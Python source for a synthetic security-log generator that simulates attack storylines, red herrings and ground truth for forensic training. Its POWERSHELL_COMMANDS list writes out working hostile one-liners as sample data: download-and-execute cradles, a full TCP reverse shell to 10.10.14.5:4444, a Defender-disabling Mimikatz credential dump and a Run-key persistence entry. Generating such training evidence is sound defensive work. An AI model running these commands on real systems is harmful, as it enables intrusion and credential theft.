# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# SPDX-License-Identifier: MIT

"""Storyline event scheduling and execution methods.

Contains the StorylineMixin with methods for:
- Storyline event execution (single and batch)
- Typed event dispatch (logon, process, connection, etc.)
- Supplementary event emission
- Command-line output file extraction
- Encoded PowerShell generation
"""

import base64
import logging
import random
import re
import shlex
import uuid
from datetime import datetime, timedelta
from types import SimpleNamespace
from typing import Any

from evidenceforge.generation.activity.application_catalog import resolve_image_path
from evidenceforge.generation.activity.helpers import _get_os_category
from evidenceforge.generation.activity.http_content import (
    normalize_mime_type_for_path,
    response_size_for_mime,
    response_size_for_status,
)
from evidenceforge.generation.activity.network import _is_private_ip
from evidenceforge.models.scenario import System, User
from evidenceforge.utils.rng import _get_rng, _stable_seed
from evidenceforge.utils.time import parse_duration, parse_iso8601

logger = logging.getLogger(__name__)


def _size_storyline_connection(
    spec,
    rng,
) -> tuple[int, int]:
    """Determine orig_bytes/resp_bytes for a storyline connection.

    Priority:
    1. Explicit spec values (author override)
    2. Heuristic sizing based on technique/description keywords
    3. Default bidirectional range
    """
    ob = spec.orig_bytes
    rb = spec.resp_bytes

    desc = (spec.description or "").lower()
    tech = (spec.technique or "").lower()

    is_exfil = "exfil" in desc or "t1041" in tech or "t1048" in tech
    is_c2 = "c2" in desc or "callback" in desc or "beacon" in desc or "t1071" in tech
    is_download = "download" in desc or "stage" in desc or "t1105" in tech

    if ob is None:
        if is_exfil:
            ob = rng.randint(1_000_000, 50_000_000)  # 1-50 MB
        elif is_c2:
            ob = rng.randint(500, 5_000)
        elif is_download:
            ob = rng.randint(200, 2_000)
        else:
            ob = rng.randint(1_000, 10_000)

    if rb is None:
        if is_exfil:
            rb = rng.randint(200, 5_000)  # small ACK/response
        elif is_c2:
            rb = rng.randint(1_000, 10_000)  # tasking payload
        elif is_download:
            rb = rng.randint(50_000, 5_000_000)  # 50KB-5MB payload
        else:
            rb = rng.randint(5_000, 50_000)

    return ob, rb


def _iter_periodic_ticks(
    start_time: datetime,
    interval_sec: float,
    duration_sec: float | None,
    count: int | None,
    jitter: float,
    rng,
):
    """Yield timestamps for periodic bulk events.

    Shared timing engine for beacon, web_scan, credential_spray, dga_queries,
    dns_tunnel, and any future periodic event types.

    Args:
        start_time: First event timestamp.
        interval_sec: Seconds between events.
        duration_sec: Total campaign length in seconds (None when using count).
        count: Exact number of events to emit (None when using duration).
        jitter: Fraction of interval to randomize (0.0–1.0).
        rng: Random number generator instance.

    Yields:
        datetime for each tick.
    """
    t = 0.0
    emitted = 0
    end_time = start_time + timedelta(seconds=duration_sec) if duration_sec is not None else None
    last_tick = None
    while True:
        if duration_sec is not None and t > duration_sec:
            break
        if count is not None and emitted >= count:
            break
        jitter_offset = rng.uniform(-jitter * interval_sec, jitter * interval_sec)
        tick_time = start_time + timedelta(seconds=max(0.0, t + jitter_offset))
        # Clamp to window end (jitter can push past duration)
        if end_time is not None and tick_time > end_time:
            tick_time = end_time
        # Ensure monotonic ordering (jitter can cause inversions)
        if last_tick is not None and tick_time < last_tick:
            tick_time = last_tick + timedelta(milliseconds=1)
        last_tick = tick_time
        yield tick_time
        emitted += 1
        t += interval_sec


def _effective_rate_interval(rate: float, count: int | None, rng) -> float:
    """Return interval for rate-based bulk events.

    Explicit count-based events stay exact. Duration/end-time based events treat
    rate as an average throughput and apply deterministic per-campaign drift so
    repeated scans with the same nominal rate do not produce identical counts.
    """
    effective_rate = rate
    if count is None:
        effective_rate *= rng.uniform(0.82, 1.18)
    return 1.0 / effective_rate


def _web_scan_connection_profile(rng) -> tuple[str, float, int, int]:
    """Return source-native connection outcome fields for one web-scan attempt."""
    conn_state = rng.choices(
        ["SF", "S0", "RSTO", "RSTR"],
        weights=[88, 4, 5, 3],
        k=1,
    )[0]
    if conn_state == "S0":
        return conn_state, rng.uniform(0.002, 0.08), rng.randint(44, 220), 0
    if conn_state in {"RSTO", "RSTR"}:
        return conn_state, rng.uniform(0.01, 0.3), rng.randint(80, 900), rng.randint(0, 400)
    return conn_state, rng.uniform(0.01, 0.5), rng.randint(200, 2000), rng.randint(200, 5000)


def _web_scan_path_allows_referrer(path_entry: dict[str, Any]) -> bool:
    """Return whether a scanner path plausibly carries a crawl Referer."""
    uri = str(path_entry.get("uri", ""))
    status = int(path_entry.get("status", 404))
    if path_entry.get("ids") or status >= 400:
        return False
    suspicious_prefixes = (
        "/.",
        "/admin",
        "/wp-",
        "/phpmyadmin",
        "/server-status",
        "/cgi-bin",
    )
    return not uri.lower().startswith(suspicious_prefixes)


def _normalize_storyline_process_image(
    process_name: str,
    os_category: str,
    username: str = "",
) -> str:
    """Normalize a storyline executable to the canonical full path when possible."""
    if "\\" in process_name or "/" in process_name:
        return process_name
    return resolve_image_path(process_name, os_category, username=username)


# Realistic decoded PowerShell commands for base64 encoding
POWERSHELL_COMMANDS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
    "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
    "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
    "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
    "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
    "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
    "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
    "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
    "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
    "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
]

# ── Story process lifetime estimation ──────────────────────────────────
# Returns (min_seconds, max_seconds) or None for long-running (no termination).

_SHORT_COMMANDS: set[str] = {
    # Windows recon
    "whoami",
    "whoami.exe",
    "ipconfig",
    "ipconfig.exe",
    "hostname",
    "hostname.exe",
    "systeminfo",
    "systeminfo.exe",
    "tasklist",
    "tasklist.exe",
    "nltest",
    "nltest.exe",
    "dir",
    "type",
    "findstr",
    "findstr.exe",
    "reg",
    "reg.exe",
    "net.exe",
    "net1.exe",
    "net",
    "net1",
    "query",
    "klist",
    "klist.exe",
    "nslookup",
    "nslookup.exe",
    "netstat",
    "netstat.exe",
    "arp",
    "arp.exe",
    "route",
    "route.exe",
    "qwinsta",
    "qwinsta.exe",
    "dsquery",
    "dsquery.exe",
    # Linux recon
    "id",
    "uname",
    "ifconfig",
    "cat",
    "ls",
    "ps",
    "ss",
    "find",
    "grep",
    "awk",
    "head",
    "tail",
    "wc",
    "env",
    "printenv",
    "df",
    "mount",
    "w",
    "last",
    "ip",
    "hostnamectl",
}

_MEDIUM_COMMANDS: set[str] = {
    "powershell.exe",
    "powershell",
    "pwsh",
    "certutil",
    "certutil.exe",
    "bitsadmin",
    "bitsadmin.exe",
    "wmic",
    "wmic.exe",
    "schtasks",
    "schtasks.exe",
    "sc",
    "sc.exe",
    "mshta",
    "mshta.exe",
    "cscript",
    "cscript.exe",
    "wscript",
    "wscript.exe",
    "rundll32",
    "rundll32.exe",
    "cmd.exe",
    "cmd",  # cmd itself is medium; the inner command may be short
    "msbuild",
    "msbuild.exe",
    "regsvr32",
    "regsvr32.exe",
    # Linux attack tools
    "curl",
    "wget",
    "python",
    "python3",
    "perl",
    "ruby",
    "mysqldump",
    "pg_dump",
    "tar",
    "gzip",
    "zip",
    "scp",
}

# Patterns in command_line that indicate long-running / persistent processes
_LONG_RUNNING_PATTERNS: list[str] = [
    "TCPClient",
    "TCPListener",
    "$s.Read",
    "ncat",
    "socat",
    "nc -l",
    "nc.exe -l",
    "meterpreter",
    "beacon",
    "reverse_tcp",
    "bind_tcp",
    "-persist",
    "--keep-alive",
    "while(true)",
    "while True",
    "Start-Sleep -Seconds 99",
    "tail -f",
]

_LONG_RUNNING_EXES: set[str] = {
    "mstsc.exe",
    "mstsc",
    "rdpclip.exe",
    "rdpclip",
    "ncat",
    "ncat.exe",
    "nc",
    "nc.exe",
    "socat",
}


def _estimate_process_lifetime(process_name: str, command_line: str) -> tuple[float, float] | None:
    """Estimate how long a story process should run before terminating.

    Returns (min_seconds, max_seconds) for the termination delay,
    or None if the process should be left running (long-lived/persistent).
    """
    # Extract bare executable name
    if "\\" in process_name:
        exe = process_name.rsplit("\\", 1)[-1].lower()
    elif "/" in process_name:
        exe = process_name.rsplit("/", 1)[-1].lower()
    else:
        exe = process_name.lower()

    # Check long-running first
    if exe in _LONG_RUNNING_EXES:
        return None
    cl_lower = command_line.lower()
    for pattern in _LONG_RUNNING_PATTERNS:
        if pattern.lower() in cl_lower:
            return None

    # For cmd.exe /c, classify based on the inner command
    if exe in ("cmd.exe", "cmd") and "/c " in cl_lower:
        inner = cl_lower.split("/c ", 1)[1].strip()
        inner_exe = inner.split()[0] if inner else ""
        # Strip path from inner exe
        if "\\" in inner_exe:
            inner_exe = inner_exe.rsplit("\\", 1)[-1]
        elif "/" in inner_exe:
            inner_exe = inner_exe.rsplit("/", 1)[-1]
        if inner_exe in _SHORT_COMMANDS:
            return (0.3, 3.0)
        if inner_exe in _MEDIUM_COMMANDS:
            return (3.0, 20.0)

    if exe in _SHORT_COMMANDS:
        return (0.3, 5.0)
    if exe in _MEDIUM_COMMANDS:
        return (5.0, 30.0)

    # Default: medium-lived unknown command
    return (2.0, 15.0)


class StorylineMixin:
    """Mixin providing storyline event scheduling and execution methods."""

    def _ensure_account_sid_tracking(self) -> None:
        """Initialize the account SID tracking dict if not already present."""
        if not hasattr(self, "_created_account_sids"):
            self._created_account_sids: dict[str, str] = {}

    def _record_last_storyline_process(self, system: System, pid: int, image: str) -> None:
        """Record the last storyline process by host for later network provenance."""
        if not hasattr(self, "_last_storyline_process_by_system"):
            self._last_storyline_process_by_system: dict[str, tuple[int, str]] = {}
        self._last_storyline_process_by_system[system.hostname] = (pid, image)
        self._last_storyline_pid = pid
        self._last_storyline_image = image
        self._last_storyline_system = system.hostname

    def _record_storyline_logon(self, actor: User, system: System, logon_id: str) -> None:
        """Record the latest storyline-created session by actor and target host."""
        if not hasattr(self, "_last_storyline_logon_by_actor_system"):
            self._last_storyline_logon_by_actor_system: dict[tuple[str, str], str] = {}
        self._last_storyline_logon_by_actor_system[(actor.username, system.hostname)] = logon_id

    def _last_storyline_logon_for_actor_system(
        self,
        actor: User,
        system: System,
    ) -> str | None:
        """Return the latest storyline-created active LogonID for this actor/host."""
        logons = getattr(self, "_last_storyline_logon_by_actor_system", {})
        logon_id = logons.get((actor.username, system.hostname))
        if not logon_id:
            return None
        session = self.state_manager.get_session(logon_id)
        if session is None or session.system != system.hostname:
            return None
        return logon_id

    def _last_storyline_process_for_system(self, system: System | None) -> tuple[int, str | None]:
        """Return last storyline process only when it belongs to the same source host."""
        if system is None:
            return -1, None
        processes = getattr(self, "_last_storyline_process_by_system", {})
        pid, image = processes.get(system.hostname, (-1, ""))
        if pid <= 0 or not image:
            return -1, None

        os_category = _get_os_category(system.os)
        if os_category == "windows" and image.startswith("/"):
            return -1, None
        if os_category == "linux" and re.match(r"^[A-Za-z]:\\", image):
            return -1, None
        return pid, image

    def _recent_storyline_process_logon_id(
        self,
        system: System,
        time: datetime,
        *,
        executable: str | None = None,
    ) -> str | None:
        """Return the LogonID from a recent storyline process on the same host."""
        pid, image = self._last_storyline_process_for_system(system)
        if pid <= 0 or not image:
            return None
        if executable:
            image_name = image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            if image_name != executable.lower():
                return None
        proc = self.state_manager.get_process(system.hostname, pid)
        if proc is None or not proc.logon_id or proc.start_time is None:
            return None
        if proc.start_time > time or time - proc.start_time > timedelta(minutes=5):
            return None
        return proc.logon_id

    def _queue_story_process_termination(
        self,
        *,
        actor: User,
        system: System,
        time: datetime,
        pid: int,
        process_name: str,
        logon_id: str,
    ) -> None:
        """Defer storyline process termination until all same-step dependents run."""
        if not hasattr(self, "_pending_story_process_terminations"):
            self._pending_story_process_terminations = []
        self._pending_story_process_terminations.append(
            {
                "actor": actor,
                "system": system,
                "time": time,
                "pid": pid,
                "process_name": process_name,
                "logon_id": logon_id,
            }
        )

    def _flush_story_process_terminations(self) -> None:
        """Emit deferred storyline terminations after process activity is complete."""
        pending = getattr(self, "_pending_story_process_terminations", [])
        if not pending:
            return
        self._pending_story_process_terminations = []
        for item in pending:
            proc = self.state_manager.get_process(item["system"].hostname, item["pid"])
            if proc is None:
                continue
            self.activity_generator.generate_process_termination(
                user=item["actor"],
                system=item["system"],
                time=item["time"],
                pid=item["pid"],
                process_name=item["process_name"],
                logon_id=item["logon_id"],
                from_storyline=True,
            )

    def _execute_storyline(self) -> None:
        """Execute storyline events (malicious/suspicious activities).

        Parses storyline events, executes them at specified times, and tracks
        them for GROUND_TRUTH.md generation. Implements baseline suppression
        (+/-5 min window) to avoid conflicts with baseline activity.

        Phase 1 Implementation:
        - Simple keyword matching for activity types
        - Basic event generation based on activity description
        - Tracking of malicious events for ground truth
        """
        total_events = len(self.scenario.storyline)
        _prev_event_time = None
        self._ensure_account_sid_tracking()

        for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
            event_time = self._parse_storyline_time(storyline_event.time)
            rng = _get_rng()
            jitter = timedelta(
                seconds=rng.uniform(-30, 30),
                microseconds=rng.randint(0, 999999),
            )
            event_time = event_time + jitter
            if _prev_event_time and event_time <= _prev_event_time:
                event_time = _prev_event_time + timedelta(milliseconds=rng.randint(100, 5000))

            actor = self._find_actor(storyline_event.actor)
            system = self._find_system(storyline_event.system)

            if not actor or not system:
                logger.warning(
                    f"Skipping storyline event: actor={storyline_event.actor}, "
                    f"system={storyline_event.system} not found"
                )
                continue

            logger.info(
                f"Executing storyline event: {storyline_event.actor} on "
                f"{storyline_event.system} at {event_time}"
            )

            self._report_progress(
                "storyline_progress",
                {
                    "event_num": event_num,
                    "total_events": total_events,
                    "actor": actor.username,
                    "system": system.hostname,
                },
            )

            self.state_manager.set_current_time(event_time)
            explicit_types = {spec.type for spec in storyline_event.events}

            # Apply human typing cadence: space events in a step with
            # realistic inter-action delays instead of shared timestamps
            from evidenceforge.utils.timing import typing_cadence

            cadence_offsets = typing_cadence(len(storyline_event.events), rng)

            previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
            self.dispatcher.storyline_cluster_id = storyline_event.id
            try:
                for i, spec in enumerate(storyline_event.events):
                    event_t = event_time + timedelta(seconds=cadence_offsets[i])
                    self.state_manager.set_current_time(event_t)
                    malicious_event = self._execute_typed_event(
                        spec=spec,
                        actor=actor,
                        system=system,
                        time=event_t,
                        activity=storyline_event.activity,
                        explicit_types=explicit_types,
                    )
                    if malicious_event:
                        self.malicious_events.append(malicious_event)
                self._flush_story_process_terminations()
            finally:
                self.dispatcher.storyline_cluster_id = previous_cluster

            if cadence_offsets:
                _prev_event_time = event_time + timedelta(seconds=cadence_offsets[-1])
            else:
                _prev_event_time = event_time

            self._barrier_flush_all_emitters()

    def _execute_single_storyline_event(self, event_idx: int) -> None:
        """Execute a single storyline event by index (used for interleaved generation)."""
        self._ensure_account_sid_tracking()
        storyline_event = self.scenario.storyline[event_idx]
        event_idx + 1

        event_time = self._parse_storyline_time(storyline_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(storyline_event.actor)
        system = self._find_system(storyline_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing interleaved storyline event: {storyline_event.actor} on {storyline_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in storyline_event.events}

        # Apply human typing cadence for intra-step event spacing
        from evidenceforge.utils.timing import typing_cadence

        cadence_offsets = typing_cadence(len(storyline_event.events), rng)

        previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
        self.dispatcher.storyline_cluster_id = storyline_event.id
        try:
            for i, spec in enumerate(storyline_event.events):
                event_t = event_time + timedelta(seconds=cadence_offsets[i])
                self.state_manager.set_current_time(event_t)
                malicious_event = self._execute_typed_event(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=event_t,
                    activity=storyline_event.activity,
                    explicit_types=explicit_types,
                )
                if malicious_event:
                    self.malicious_events.append(malicious_event)
            self._flush_story_process_terminations()
        finally:
            self.dispatcher.storyline_cluster_id = previous_cluster

    def _execute_single_red_herring_event(self, event_idx: int) -> None:
        """Execute a single red herring event by index.

        Uses the same event execution path as storyline events but tracks
        results in red_herring_events instead of malicious_events.
        """
        self._ensure_account_sid_tracking()
        rh_event = self.scenario.red_herrings[event_idx]

        event_time = self._parse_storyline_time(rh_event.time)
        rng = _get_rng()
        jitter = timedelta(
            seconds=rng.uniform(-30, 30),
            microseconds=rng.randint(0, 999999),
        )
        event_time = event_time + jitter

        actor = self._find_actor(rh_event.actor)
        system = self._find_system(rh_event.system)
        if not actor or not system:
            return

        logger.info(
            f"Executing red herring event: {rh_event.actor} on {rh_event.system} at {event_time}"
        )

        self.state_manager.set_current_time(event_time)

        explicit_types = {spec.type for spec in rh_event.events}

        # Apply typing cadence so logon events precede process events
        # within compound red herring steps (same as storyline events)
        from evidenceforge.utils.timing import typing_cadence

        cadence_offsets = typing_cadence(len(rh_event.events), rng)

        previous_cluster = getattr(self.dispatcher, "storyline_cluster_id", None)
        self.dispatcher.storyline_cluster_id = f"red_herring:{rh_event.id}"
        try:
            for i, spec in enumerate(rh_event.events):
                event_t = event_time + timedelta(seconds=cadence_offsets[i])
                self.state_manager.set_current_time(event_t)
                result = self._execute_typed_event(
                    spec=spec,
                    actor=actor,
                    system=system,
                    time=event_t,
                    activity=rh_event.activity,
                    explicit_types=explicit_types,
                )
                if result:
                    # Track as red herring, not malicious
                    result["explanation"] = rh_event.explanation
                    self.red_herring_events.append(result)
            self._flush_story_process_terminations()
        finally:
            self.dispatcher.storyline_cluster_id = previous_cluster

    def _execute_typed_event(
        self,
        spec,  # EventSpec union type
        actor: User,
        system: System,
        time: datetime,
        activity: str,
        explicit_types: set[str],
    ) -> dict | None:
        """Execute a single typed event from the storyline events list.

        Each event spec type maps to a specific generate_* method on ActivityGenerator.
        Returns a malicious_event dict for GROUND_TRUTH.md.
        """
        rng = _get_rng()
        malicious_event = {
            "time": time,
            "actor": actor.username,
            "system": system.hostname,
            "activity": activity,
            "type": spec.type,
        }

        def _ground_truth_uid(uid: str, src_ip: str, dst_ip: str) -> str:
            if not uid:
                return "(filtered by sensor placement)"
            visibility = getattr(self.dispatcher, "visibility_engine", None)
            if visibility is None:
                return uid
            from evidenceforge.events.dispatcher import expand_formats
            from evidenceforge.generation.emitters.zeek_base import SensorMultiplexEmitter

            for sensor in visibility.get_observing_sensors(src_ip, dst_ip):
                if "zeek_conn" in expand_formats(sensor.log_formats):
                    hostname = sensor.hostname or sensor.name
                    return SensorMultiplexEmitter._derive_sensor_uid(uid, hostname)
            return "(filtered by sensor placement)"

        if spec.type == "logon":
            _attacker_ips = [
                "45.33.32.156",
                "185.220.101.34",
                "91.219.236.174",
                "23.129.64.210",
                "116.202.120.181",
            ]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            logon_id = self.activity_generator.generate_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
            )
            # Protect storyline-created sessions from baseline logoff
            session = self.state_manager.get_session(logon_id)
            if session:
                session.storyline_protected = True
            malicious_event["logon_id"] = logon_id
            malicious_event["source_ip"] = source_ip
            self._record_storyline_logon(actor, system, logon_id)

        elif spec.type == "failed_logon":
            _attacker_ips = ["45.33.32.156", "185.220.101.34", "91.219.236.174"]
            source_ip = spec.source_ip or rng.choice(_attacker_ips)
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                None,
            )
            self.activity_generator.generate_failed_logon(
                user=actor,
                system=system,
                time=time,
                logon_type=spec.logon_type,
                source_ip=source_ip,
                target_username=getattr(spec, "target_username", None),
                dc_system=dc,
            )
            malicious_event["source_ip"] = source_ip

        elif spec.type == "logoff":
            sessions = self.state_manager.get_sessions_for_user(actor.username)
            target_session = next((s for s in sessions if s.system == system.hostname), None)
            if target_session:
                self.activity_generator.generate_logoff(
                    actor, system, time, target_session.logon_id, from_storyline=True
                )

        elif spec.type == "process":
            if hasattr(self, "world_planner"):
                # Built-in/service accounts (SYSTEM, LOCAL SERVICE, etc.) run
                # locally — don't fabricate remote logon evidence for them.
                from evidenceforge.validation.schema import BUILTIN_ACCOUNTS

                service_accounts = set(self.scenario.environment.service_accounts)
                is_local_account = (
                    actor.username in BUILTIN_ACCOUNTS or actor.username in service_accounts
                )
                if is_local_account:
                    # Use existing system session or create a service logon
                    sessions = self.state_manager.get_sessions_for_user(actor.username)
                    target_session = next(
                        (s for s in sessions if s.system == system.hostname), None
                    )
                    if target_session:
                        logon_id = target_session.logon_id
                    else:
                        logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
                        logon_id = self.activity_generator.generate_service_logon(
                            system=system,
                            time=logon_time,
                            service_account=actor.username,
                        )
                else:
                    logon_id = self._last_storyline_logon_for_actor_system(actor, system)
                    if logon_id is None:
                        # Pre-compute the session kind via the planner so reuse
                        # filtering matches the correct transport type.
                        plan = self.world_model.plan_session(
                            user=actor,
                            target_system=system,
                            rng=rng,
                        )
                        target_session = self.world_planner.ensure_user_session(
                            actor,
                            system,
                            time,
                            rng,
                            session_kind=plan.session_kind,
                            storyline_protected=True,
                        )
                        logon_id = target_session.logon_id
                        self._record_storyline_logon(actor, system, logon_id)
            else:
                sessions = self.state_manager.get_sessions_for_user(actor.username)
                target_session = next((s for s in sessions if s.system == system.hostname), None)
                if not target_session:
                    logon_time = time - timedelta(seconds=rng.uniform(0.5, 2.0))
                    logon_id = self.activity_generator.generate_logon(
                        actor, system, logon_time, logon_type=3
                    )
                    self._record_storyline_logon(actor, system, logon_id)
                else:
                    logon_id = target_session.logon_id

            os_category = _get_os_category(system.os)
            process_name = _normalize_storyline_process_image(
                spec.process_name,
                os_category,
                username=actor.username,
            )
            command_line = spec.command_line or process_name
            shell_key = (system.hostname, actor.username)

            if os_category == "linux":
                if not hasattr(self, "_storyline_shell_available_at"):
                    self._storyline_shell_available_at: dict[tuple[str, str], datetime] = {}
                available_at = self._storyline_shell_available_at.get(shell_key)
                if available_at is not None and time < available_at:
                    time = available_at + timedelta(seconds=rng.uniform(0.3, 2.0))

            if os_category == "linux":
                self.activity_generator.generate_bash_command(actor, system, time, command_line)

            if "<base64_encoded_command>" in command_line:
                command_line = command_line.replace(
                    "<base64_encoded_command>",
                    self._generate_encoded_powershell(
                        _stable_seed(f"storyline_ps_{time.isoformat()}_{actor.username}")
                    ),
                )

            parent_pid = self.activity_generator._resolve_parent(
                system, actor, time, logon_id, process_name
            )
            pid = self.activity_generator.generate_process(
                user=actor,
                system=system,
                time=time,
                logon_id=logon_id,
                process_name=process_name,
                command_line=command_line,
                parent_pid=parent_pid,
                ensure_file_event=True,
                from_storyline=True,
            )
            self.activity_generator._record_user_process(system, actor, pid, process_name)
            self._record_last_storyline_process(system, pid, process_name)
            malicious_event["process_name"] = process_name
            malicious_event["command_line"] = command_line
            malicious_event["pid"] = pid

            output_file = self._extract_output_file(command_line, os_category)
            if output_file:
                if os_category == "linux" and output_file.startswith("~/"):
                    home = "/root" if actor.username == "root" else f"/home/{actor.username}"
                    output_file = f"{home}/{output_file[2:]}"
                file_time = time + timedelta(seconds=rng.uniform(0.5, 3.0))
                from evidenceforge.events.base import SecurityEvent
                from evidenceforge.events.contexts import (
                    AuthContext,
                    EdrContext,
                    FileContext,
                    ProcessContext,
                )

                host_ctx = self.activity_generator._build_host_context(system)
                running_proc = self.state_manager.get_process(system.hostname, pid)
                proc_obj_id = self.state_manager.get_process_object_id(system.hostname, pid)
                self.dispatcher.dispatch(
                    SecurityEvent(
                        timestamp=file_time,
                        event_type="file_create",
                        src_host=host_ctx,
                        auth=AuthContext(username=actor.username),
                        process=ProcessContext(
                            pid=pid,
                            parent_pid=parent_pid,
                            image=process_name,
                            command_line=command_line,
                            username=actor.username,
                            logon_id=logon_id,
                            start_time=running_proc.start_time
                            if running_proc is not None
                            else None,
                        ),
                        file=FileContext(path=output_file, action="create", pid=pid),
                        edr=EdrContext(object_id=str(uuid.uuid4()), actor_id=proc_obj_id),
                        storyline_origin=True,
                    )
                )
                malicious_event["output_file"] = output_file

            http_url = self._extract_http_url(command_line)
            if http_url is not None:
                from urllib.parse import urlparse

                parsed_url = urlparse(http_url)
                if parsed_url.hostname:
                    hostname = parsed_url.hostname
                    dst_ip = self._resolve_storyline_network_target(hostname)
                    if dst_ip is None:
                        from evidenceforge.generation.activity.dns_registry import resolve_domain_ip

                        dst_ip = resolve_domain_ip(hostname, src_host=system.hostname)
                    dst_port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
                    service = "ssl" if dst_port == 443 else "http"
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=dst_ip,
                        time=time + timedelta(milliseconds=rng.randint(250, 900)),
                        dst_port=dst_port,
                        proto="tcp",
                        service=service,
                        duration=rng.uniform(0.8, 6.0),
                        orig_bytes=rng.randint(300, 1400),
                        resp_bytes=rng.randint(12_000, 250_000),
                        conn_state="SF",
                        emit_dns=not _is_private_ip(dst_ip),
                        source_system=system,
                        pid=pid,
                        hostname=hostname,
                        process_image=process_name,
                    )
                    malicious_event["network_url"] = http_url

            scp_target = self._extract_scp_target(command_line, os_category)
            if scp_target is not None:
                dst_ip = self._resolve_storyline_network_target(scp_target)
                if dst_ip:
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=dst_ip,
                        time=time + timedelta(milliseconds=rng.randint(250, 900)),
                        dst_port=22,
                        proto="tcp",
                        service="ssh",
                        duration=rng.uniform(2.0, 30.0),
                        orig_bytes=rng.randint(20_000, 250_000),
                        resp_bytes=rng.randint(4_000, 40_000),
                        conn_state="SF",
                        emit_dns=not _is_private_ip(dst_ip),
                        source_system=system,
                        pid=pid,
                        process_image=process_name,
                    )

            _EXPLICIT_CRED_TOOLS = {"psexec", "wmic", "runas", "schtasks", "net.exe", "net1.exe"}
            proc_basename = (
                process_name.rsplit("\\", 1)[-1].lower()
                if "\\" in process_name
                else process_name.lower()
            )
            if proc_basename in _EXPLICIT_CRED_TOOLS and os_category == "windows":
                cred_time = time - timedelta(milliseconds=rng.randint(5, 50))
                self.activity_generator.generate_explicit_credentials(
                    user=actor,
                    system=system,
                    time=cred_time,
                    target_username=actor.username,
                    target_server="localhost",
                    process_name=process_name,
                    process_pid=pid,
                )

            if os_category == "windows" and getattr(spec, "supplementary", "auto") != "none":
                self.activity_generator._expand_and_emit(
                    "process_create",
                    time,
                    actor=actor,
                    target_system=system,
                    command_line=command_line,
                    os_category=os_category,
                    logon_id=logon_id,
                    skip_types=explicit_types,
                )

            # Mark as story process and schedule termination
            self.state_manager.mark_story_process(system.hostname, pid)
            lifetime = _estimate_process_lifetime(process_name, command_line)
            if lifetime is not None:
                term_delay = rng.uniform(lifetime[0], lifetime[1])
                term_time = time + timedelta(seconds=term_delay)
                self._queue_story_process_termination(
                    actor=actor,
                    system=system,
                    time=term_time,
                    pid=pid,
                    process_name=process_name,
                    logon_id=logon_id,
                )
                if os_category == "linux":
                    self._storyline_shell_available_at[shell_key] = term_time

        elif spec.type == "connection":
            _c2_ips = ["159.65.43.201", "134.209.29.115", "167.71.156.88"]
            source_ip = spec.source_ip or system.ip
            dst_ip = spec.dst_ip
